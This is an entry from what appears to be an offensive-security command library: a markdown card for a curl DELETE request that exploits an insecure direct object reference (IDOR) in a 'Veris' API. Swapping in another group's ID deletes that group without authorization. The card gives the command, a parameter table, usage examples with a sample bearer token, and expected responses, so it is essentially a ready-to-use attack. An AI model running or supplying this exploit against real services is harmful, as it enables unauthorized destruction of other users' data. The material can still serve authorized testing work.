---
data: >-
  curl -X DELETE 'https://veris.example.com/api/groups/{target-group-id}' -H
  'Authorization: Bearer {token}' -H 'Content-Type: application/json' -v
tags:
  - web
  - api
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e03fe04c-5d57-489c-abf7-702d6c59d049
created_at: '2025-12-14T17:25:23.179Z'
updated_at: '2025-12-14T17:25:23.179Z'
verified: false
validated: true
submitted: true
---
# curl-modify-group-id

## Command

```bash
curl -X DELETE 'https://veris.example.com/api/groups/{target-group-id}' -H 'Authorization: Bearer {token}' -H 'Content-Type: application/json' -v
```

## Description

This command executes a modified group deletion request in Veris by substituting the target group_id, exploiting IDOR to perform unauthorized deletions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | HTTP DELETE method | Yes |
| `https://veris.example.com/api/groups/{target-group-id}` | Endpoint with modified ID | Yes |
| `-H 'Authorization: Bearer {token}'` | Bearer token for auth | Yes |
| `-H 'Content-Type: application/json'` | JSON type header | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -X DELETE 'https://veris.example.com/api/groups/456' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' -v
```

### Advanced Usage

```bash
curl -X DELETE 'https://veris.example.com/api/groups/456' -H 'Authorization: Bearer {token}' -d '{"confirm": true}' -v
```

## Expected Output

Successful response like 200 OK with deletion confirmation; failure might show 404 if ID invalid or 403 if partially secured.

## Related

- [[Related Procedure: Intercept-and-Modify-Group-Deletion-Request]]
- [[commands/curl-capture-group-delete]]
